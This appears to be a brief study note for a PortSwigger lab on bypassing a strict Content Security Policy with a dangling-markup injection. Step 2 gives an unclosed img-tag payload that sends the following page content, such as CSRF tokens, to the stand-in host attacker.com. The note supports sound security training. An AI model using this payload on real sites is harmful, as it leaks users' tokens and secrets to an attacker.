# Reflected XSS protected by very strict CSP, with dangling markup attack

### Goal -

Perform a reflected XSS attack that bypasses a very strict Content Security Policy using a dangling markup technique.

### Exploitation

1. Identify that the CSP blocks JavaScript execution
2. Inject HTML that creates a dangling markup (e.g., `<img src='https://attacker.com/?`)
3. The unclosed attribute captures subsequent HTML content
4. The captured content (including CSRF tokens or secrets) is sent to the attacker's server

## PortSwigger Lab

**Official lab:** Reflected XSS protected by very strict CSP, with dangling markup attack

**PortSwigger:** https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack
